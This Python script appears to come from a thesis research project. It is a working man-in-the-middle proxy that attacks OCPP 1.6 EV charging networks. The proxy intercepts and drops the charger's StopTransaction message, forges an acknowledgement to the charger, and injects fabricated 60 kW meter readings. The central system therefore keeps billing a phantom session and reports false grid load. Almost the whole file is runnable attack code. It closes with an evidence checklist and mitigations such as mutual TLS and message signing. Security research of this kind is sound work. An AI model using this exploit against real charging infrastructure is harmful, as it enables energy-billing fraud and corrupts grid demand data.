"""
===========================================================================
EVSecSim PoC — Attack #6: Duration Spoofing (StopTransaction Suppression)
===========================================================================

ATTACK OVERVIEW
---------------
OCPP 1.6 gives the CSMS no independent way to detect physical EV disconnect.
It relies entirely on the EVSE sending StopTransaction. A MITM proxy can:

  1. DROP the EVSE's StopTransaction before it reaches the CSMS.
  2. Forge a StopTransaction ACK back to the EVSE so it disconnects cleanly.
  3. Inject synthetic MeterValues + Heartbeat to the CSMS, sustaining a
     phantom charging session for GHOST_DURATION_S seconds.

Effect: CSMS reports 60 kW active load on a physically idle charger.
In PGTwin, the phantom load propagates as real grid demand — causing
cumulative energy imbalance that grows linearly with ghost duration.

This is the OPPOSITE of premature termination (attack_mitm_session_patched).

ATTACK PHASES
-------------
  Phase 1 — Transparent relay    : all EVSE↔CSMS traffic forwarded + logged
  Phase 2 — StopTransaction DROP : EVSE's StopTransaction intercepted.
                                   Forged ACK sent to EVSE → clean disconnect.
                                   NOT forwarded to CSMS.
  Phase 3 — Ghost session        : Proxy injects synthetic MeterValues to
                                   CSMS every METER_INTERVAL_S seconds for
                                   GHOST_DURATION_S seconds. Final real
                                   StopTransaction sent at end to clean up.

THREAT MODEL
------------
  Attacker on operator-net (ARP poisoning / rogue switch).
  EVSE is redirected to proxy port 9003 instead of CSMS port 9000.
  Proxy transparently relays upstream to real CSMS.

REFERENCE
---------
  Dr. Jit Lim (SUTD) — thesis supervision notes: duration spoofing as the
  primary PGTwin integration target (phantom load → cumulative energy
  imbalance in grid simulation).
===========================================================================
"""

import asyncio
import json
import os
import signal
import time
import argparse
import websockets
from datetime import datetime, timezone

# ===========================================================================
# CONFIG
# ===========================================================================

PROXY_PORT       = 9003
CSMS_URL         = "ws://127.0.0.1:9000"
GHOST_DURATION_S = 60    # seconds to sustain phantom session after real disconnect
METER_INTERVAL_S = 10    # synthetic MeterValues injection interval (seconds)

# ===========================================================================
# COLOUR HELPERS
# ===========================================================================

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log_proxy(msg):   print(f"{CYAN}[PRX {ts()}]{RESET} {msg}")
def log_evse(msg):    print(f"{GREEN}[E→C {ts()}]{RESET} {msg}")
def log_csms(msg):    print(f"{BLUE}[C→E {ts()}]{RESET} {msg}")
def log_attack(msg):  print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_ghost(msg):   print(f"{MAGENTA}[GHO {ts()}]{RESET} {msg}")

# ===========================================================================
# OCPP MESSAGE HELPERS
# ===========================================================================

CALL       = 2
CALLRESULT = 3
CALLERROR  = 4

def parse_ocpp(raw: str):
    try:
        msg = json.loads(raw)
        if msg[0] == CALL:
            return CALL, msg[1], msg[2], msg[3]
        elif msg[0] == CALLRESULT:
            return CALLRESULT, msg[1], None, msg[2]
        elif msg[0] == CALLERROR:
            return CALLERROR, msg[1], msg[2], msg[3]
    except Exception:
        pass
    return None, None, None, None

def forge_stop_ack(uid: str) -> str:
    """Forge a CSMS CallResult for StopTransaction so the EVSE disconnects cleanly."""
    return json.dumps([CALLRESULT, uid, {"idTagInfo": {"status": "Accepted"}}])

def forge_meter_values(transaction_id: int, connector_id: int, meter_wh: int) -> tuple:
    uid = f"ghost-mv-{int(time.time())}"
    payload = {
        "connectorId": connector_id,
        "transactionId": transaction_id,
        "meterValue": [{
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "sampledValue": [
                {
                    "value": str(meter_wh),
                    "measurand": "Energy.Active.Import.Register",
                    "unit": "Wh",
                },
                {
                    "value": "60.0",
                    "measurand": "Power.Active.Import",
                    "unit": "kW",
                },
            ],
        }]
    }
    return json.dumps([CALL, uid, "MeterValues", payload]), uid

# ===========================================================================
# SESSION STATE
# ===========================================================================

class SessionState:
    def __init__(self):
        self.connected_at   = None
        self.cp_id          = None
        self.transaction_id = 1
        self.connector_id   = 1
        self.meter_stop_wh  = 0      # real final meter reading from dropped StopTransaction
        self.stop_dropped   = False
        self.msg_count_ec   = 0
        self.msg_count_ce   = 0
        self.ghost_count    = 0
        self.actions_seen   = []

    def elapsed(self) -> float:
        return 0.0 if self.connected_at is None else time.perf_counter() - self.connected_at

# ===========================================================================
# RELAY COROUTINES
# ===========================================================================

async def evse_to_csms(evse_ws, csms_ws, state: SessionState):
    """Relay EVSE→CSMS transparently, except StopTransaction which is dropped."""
    async for raw in evse_ws:
        state.msg_count_ec += 1
        mtype, uid, action, payload = parse_ocpp(raw)
        if action:
            state.actions_seen.append(action)

        # Capture connectorId from StartTransaction for ghost phase
        if action == "StartTransaction" and payload:
            state.connector_id = payload.get("connectorId", 1)
            log_evse(f"[StartTransaction] connectorId={state.connector_id} → forwarding")
            await csms_ws.send(raw)
            continue

        # === PHASE 2: DROP StopTransaction ===
        if action == "StopTransaction":
            if payload:
                state.transaction_id = payload.get("transactionId", state.transaction_id)
                state.meter_stop_wh  = payload.get("meterStop", 0)

            state.stop_dropped = True
            print()
            log_attack("=" * 62)
            log_attack("PHASE 2 — StopTransaction INTERCEPTED AND DROPPED")
            log_attack(f"  EVSE '{state.cp_id}' → NOT forwarded to CSMS")
            log_attack(f"  transactionId : {state.transaction_id}")
            log_attack(f"  meterStop     : {state.meter_stop_wh} Wh  (real final reading)")
            log_attack(f"  Forging ACK → EVSE disconnects cleanly, CSMS never learns")
            log_attack("=" * 62)
            print()

            try:
                await evse_ws.send(forge_stop_ack(uid))
                log_attack("Forged StopTransaction ACK sent to EVSE")
            except Exception as exc:
                log_attack(f"ACK send failed: {exc}")

            return  # exit loop — EVSE disconnects after receiving the forged ACK

        # All other messages: transparent forward
        if action:
            log_evse(f"[{action}] uid={uid[:8] if uid else '?'} → forwarding")
        else:
            log_evse(f"[Response uid={uid[:8] if uid else '?'}] → forwarding")
        await csms_ws.send(raw)


async def csms_to_evse(csms_ws, evse_ws, state: SessionState):
    """Relay CSMS→EVSE. Captures transactionId from StartTransaction ACK."""
    async for raw in csms_ws:
        state.msg_count_ce += 1
        mtype, uid, action, payload = parse_ocpp(raw)

        # Capture transactionId from CSMS's StartTransaction CallResult
        if mtype == CALLRESULT and payload and "transactionId" in payload:
            state.transaction_id = payload["transactionId"]
            log_csms(f"[StartTransaction ACK] transactionId={state.transaction_id} captured")

        if action:
            log_csms(f"[{action}] → relaying to EVSE")
        else:
            log_csms(f"[Response uid={uid[:8] if uid else '?'}] → relaying to EVSE")

        if state.stop_dropped:
            return  # EVSE is already disconnecting

        try:
            await evse_ws.send(raw)
        except websockets.exceptions.ConnectionClosed:
            return

# ===========================================================================
# GHOST SESSION
# ===========================================================================

async def ghost_session(csms_ws, state: SessionState):
    """
    Inject synthetic MeterValues to CSMS after EVSE disconnects.
    CSMS believes the session is still active for GHOST_DURATION_S seconds.
    """
    print()
    log_ghost("=" * 62)
    log_ghost("PHASE 3 — GHOST SESSION ACTIVE")
    log_ghost(f"  EVSE '{state.cp_id}' physically gone — CSMS sees active session")
    log_ghost(f"  transactionId  : {state.transaction_id}")
    log_ghost(f"  Starting meter : {state.meter_stop_wh} Wh  (real final reading)")
    log_ghost(f"  Ghost duration : {GHOST_DURATION_S}s  (MeterValues every {METER_INTERVAL_S}s)")
    log_ghost(f"  Phantom power  : 60.0 kW = {60.0 * METER_INTERVAL_S / 3600:.4f} kWh/interval")
    log_ghost("=" * 62)
    print()

    phantom_wh  = state.meter_stop_wh
    ghost_start = time.perf_counter()
    increment   = int(60.0 * METER_INTERVAL_S / 3600 * 1000)   # Wh per interval at 60 kW

    while time.perf_counter() - ghost_start < GHOST_DURATION_S:
        await asyncio.sleep(METER_INTERVAL_S)
        state.ghost_count += 1
        phantom_wh += increment

        frame, uid = forge_meter_values(state.transaction_id, state.connector_id, phantom_wh)
        try:
            await csms_ws.send(frame)
            log_ghost(
                f"Phantom MeterValues #{state.ghost_count}: "
                f"{phantom_wh} Wh  (+{increment} Wh phantom energy)"
            )
            # Consume and discard the CSMS ACK
            try:
                await asyncio.wait_for(csms_ws.recv(), timeout=3.0)
            except asyncio.TimeoutError:
                pass
        except websockets.exceptions.ConnectionClosed:
            log_ghost("CSMS closed connection during ghost phase")
            return

    # Send a real StopTransaction to close phantom session on CSMS
    print()
    phantom_kwh = (phantom_wh - state.meter_stop_wh) / 1000.0
    log_ghost(f"Ghost ended — {phantom_kwh:.4f} kWh phantom energy injected")
    log_ghost("Sending final StopTransaction to CSMS")

    uid = f"ghost-stop-{int(time.time())}"
    final_stop = json.dumps([CALL, uid, "StopTransaction", {
        "transactionId": state.transaction_id,
        "timestamp":     datetime.now(timezone.utc).isoformat(),
        "meterStop":     phantom_wh,
        "reason":        "Local",
    }])
    try:
        await csms_ws.send(final_stop)
        log_ghost(f"Final StopTransaction: meterStop={phantom_wh} Wh (includes phantom energy)")
    except Exception as exc:
        log_ghost(f"Final StopTransaction failed: {exc}")

# ===========================================================================
# CORE PROXY
# ===========================================================================

async def proxy_session(evse_ws, state: SessionState):
    log_proxy("EVSE connected — opening upstream CSMS connection")

    try:
        async with websockets.connect(
            CSMS_URL, ping_interval=None, ping_timeout=None,
        ) as csms_ws:

            log_proxy(f"Upstream connection established: {CSMS_URL}")

            # CP identity relay (non-standard first-frame identification)
            cp_id_raw = await evse_ws.recv()
            state.cp_id = cp_id_raw
            state.connected_at = time.perf_counter()
            log_proxy(f"CP identity: '{cp_id_raw}' → relaying to CSMS")
            await csms_ws.send(cp_id_raw)

            log_attack("=" * 62)
            log_attack(f"DURATION SPOOF PROXY ACTIVE — CP: '{cp_id_raw}'")
            log_attack(f"Waiting for StopTransaction to intercept...")
            log_attack(f"Ghost: {GHOST_DURATION_S}s  |  Interval: {METER_INTERVAL_S}s")
            log_attack("=" * 62)
            print()

            # Phase 1 + 2: relay until StopTransaction is seen from EVSE
            t_e2c = asyncio.create_task(evse_to_csms(evse_ws, csms_ws, state), name="evse->csms")
            t_c2e = asyncio.create_task(csms_to_evse(csms_ws, evse_ws, state), name="csms->evse")

            done, pending = await asyncio.wait(
                [t_e2c, t_c2e],
                return_when=asyncio.FIRST_COMPLETED,
            )
            for task in pending:
                task.cancel()
            for task in list(done) + list(pending):
                try:
                    await task
                except (asyncio.CancelledError,
                        websockets.exceptions.ConnectionClosedOK,
                        websockets.exceptions.ConnectionClosedError):
                    pass

            if not state.stop_dropped:
                log_proxy("EVSE disconnected before sending StopTransaction — no ghost phase")
                return

            # Phase 3: ghost session (csms_ws still open inside this context block)
            await ghost_session(csms_ws, state)

    except ConnectionRefusedError:
        log_attack(f"Cannot reach CSMS at {CSMS_URL}")
    except Exception as exc:
        log_proxy(f"Session error: {type(exc).__name__}: {exc}")
    finally:
        _print_summary(state)


def _print_summary(state: SessionState):
    real_kwh    = state.meter_stop_wh / 1000.0
    phantom_kwh = state.ghost_count * (60.0 * METER_INTERVAL_S / 3600.0)
    elapsed     = state.elapsed()
    print()
    print(f"{BOLD}{'='*62}{RESET}")
    print(f"{BOLD}  Session summary — CP '{state.cp_id}'{RESET}")
    print(f"{'='*62}")
    print(f"  Total proxy duration       : {elapsed:.1f}s")
    print(f"  Real charge energy         : {real_kwh:.4f} kWh")
    print(f"  Phantom energy injected    : {phantom_kwh:.4f} kWh")
    print(f"  Phantom MeterValues sent   : {state.ghost_count}")
    print(f"  StopTransaction dropped    : {'YES' if state.stop_dropped else 'NO'}")
    print(f"  EVSE→CSMS messages         : {state.msg_count_ec}")
    print(f"  CSMS→EVSE messages         : {state.msg_count_ce}")
    print(f"  Actions observed           : {', '.join(sorted(set(state.actions_seen)))}")
    print(f"{'='*62}")
    print()
    print(f"  {YELLOW}PGTwin IMPACT:{RESET}")
    print(f"  - CSMS shows 60 kW active for {GHOST_DURATION_S}s after real disconnect")
    print(f"  - Cumulative phantom energy : {phantom_kwh:.4f} kWh  ({phantom_kwh*1000:.1f} Wh)")
    print(f"  - Grid simulation error    : +{phantom_kwh:.4f} kWh per spoofed session")
    print()
    print(f"  {YELLOW}THESIS EVIDENCE CHECKLIST:{RESET}")
    print(f"  [ ] pcap: StopTransaction on port 9003 (EVSE→proxy), absent on port 9000")
    print(f"  [ ] pcap: forged ACK on port 9003 (proxy→EVSE) at same instant")
    print(f"  [ ] pcap: phantom MeterValues on port 9000 after port 9003 goes silent")
    print(f"  [ ] CSMS log: session stays open + phantom power readings after EVSE gone")
    print(f"  [ ] EVSE log: normal clean exit — EVSE unaware it was spoofed")
    print()
    print(f"  {CYAN}MITIGATION:{RESET}")
    print(f"  - WSS + mutual TLS: prevents MITM interposition entirely")
    print(f"  - CSMS Heartbeat timeout: detects absent EVSE (Heartbeat stops with EVSE)")
    print(f"  - OCPP 2.0.1 message signing: StopTransaction integrity enforced")
    print(f"  - Physical pilot-signal monitoring: CSMS cross-checks EV presence")
    print()

# ===========================================================================
# PROXY SERVER
# ===========================================================================

async def run_proxy():
    state_store = {}

    async def handler(evse_ws):
        state = SessionState()
        sid = id(evse_ws)
        state_store[sid] = state
        try:
            await proxy_session(evse_ws, state)
        finally:
            state_store.pop(sid, None)

    proxy_bind = os.environ.get("PROXY_BIND", "0.0.0.0")
    server = await websockets.serve(
        handler, proxy_bind, PROXY_PORT,
        ping_interval=None, ping_timeout=None,
    )

    print()
    print(f"{BOLD}{RED}{'='*62}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim PoC — Duration Spoofing (StopTransaction Drop){RESET}")
    print(f"{BOLD}{RED}{'='*62}{RESET}")
    print(f"  Proxy listening on : ws://0.0.0.0:{PROXY_PORT}")
    print(f"  Forwarding to CSMS : {CSMS_URL}")
    print(f"  Ghost duration     : {GHOST_DURATION_S}s after real disconnect")
    print(f"  Meter interval     : {METER_INTERVAL_S}s (synthetic MeterValues)")
    print(f"  Threat model       : MITM on operator-net (ARP / rogue switch)")
    print(f"{BOLD}{RED}{'='*62}{RESET}")
    print()

    stop = asyncio.Event()

    def handle_signal(*_):
        print("\nShutting down proxy...")
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_event_loop().add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            signal.signal(sig, handle_signal)

    await stop.wait()
    server.close()
    await server.wait_closed()

# ===========================================================================
# CLI + ENTRY POINT
# ===========================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="EVSecSim PoC #6 — Duration Spoofing (StopTransaction suppression)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default: proxy on 9003, ghost for 60s, MeterValues every 10s
  python attack_duration_spoof.py

  # Longer ghost phase for PGTwin integration demo
  python attack_duration_spoof.py --ghost-duration 120 --meter-interval 5

  # Custom upstream CSMS
  python attack_duration_spoof.py --csms-url ws://csms:9000 --proxy-port 9003
        """,
    )
    parser.add_argument("--proxy-port",     type=int,   default=PROXY_PORT)
    parser.add_argument("--csms-url",       default=CSMS_URL)
    parser.add_argument("--ghost-duration", type=float, default=GHOST_DURATION_S)
    parser.add_argument("--meter-interval", type=float, default=METER_INTERVAL_S)
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    PROXY_PORT       = args.proxy_port
    CSMS_URL         = args.csms_url
    GHOST_DURATION_S = args.ghost_duration
    METER_INTERVAL_S = args.meter_interval

    try:
        asyncio.run(run_proxy())
    except KeyboardInterrupt:
        pass
